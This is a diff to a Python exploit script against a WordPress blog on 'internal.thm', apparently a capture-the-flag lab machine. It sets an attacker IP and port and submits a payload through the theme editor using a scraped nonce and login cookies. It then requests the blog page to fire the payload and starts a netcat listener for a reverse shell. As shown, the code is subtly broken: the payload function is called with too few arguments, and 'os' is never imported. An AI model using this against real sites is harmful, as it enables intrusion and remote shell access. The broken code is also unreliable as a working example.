@@ -1,8 +1,8 @@
 import requests
 import re
 
-MYIP = 
-MYPORT = 
+MYIP = "10.14.39.17"
+MYPORT = 4242
 find_nonce = re.compile(r'<input type="hidden" id="nonce" name="nonce" value="([^"]*)" />')
 payload = lambda ip, port, nonce: {"nonce": nonce,
 "_wp_http_referer": "/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen",
@@ -37,3 +37,5 @@ theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?
 nonce = find_nonce.search(theme_editor.text)[1]
 print("* Poof")
 theme_editor = requests.post("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
+os.system("curl http://internal.thm/blog/ >/dev/null &")
+os.system(f"nc -l -vv -p {MYPORT}")
